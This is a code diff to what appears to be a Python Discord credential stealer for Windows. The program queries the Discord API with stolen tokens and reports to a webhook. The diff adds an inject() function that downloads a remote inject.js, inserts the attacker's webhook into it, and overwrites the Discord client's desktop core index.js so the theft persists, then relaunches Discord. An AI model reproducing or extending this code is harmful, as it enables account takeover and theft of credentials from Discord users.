@@ -5,7 +5,7 @@ import winreg
 from base64 import b64decode
 from json import load, loads
 from platform import platform
-from re import findall
+from re import findall, match
 from shutil import copy2
 from sqlite3 import connect
 from subprocess import PIPE, Popen
@@ -50,6 +50,8 @@ def main(webhook_url):
 
     cleanup()
 
+    inject()
+    
 def accinfo():
     r = requests.get(
         'https://discord.com/api/v9/users/@me',
@@ -419,7 +421,19 @@ def cleanup():
 
         try: clean()
         except: pass        
-                        
+
+def inject(webhook_url):
+    appdata = os.getenv("localappdata")
+    for _dir in os.listdir(appdata):
+        if 'discord' in _dir.lower():
+            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
+                if match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
+                    f = requests.get("https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js").text.replace("%WEBHOOK%", webhook_url)
+                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                        indexFile.write(f)
+                    os.startfile(abspath+os.sep+_dir+'.exe')
+                                            
 if __name__ == '__main__':
     if os.name != "nt":
         exit()
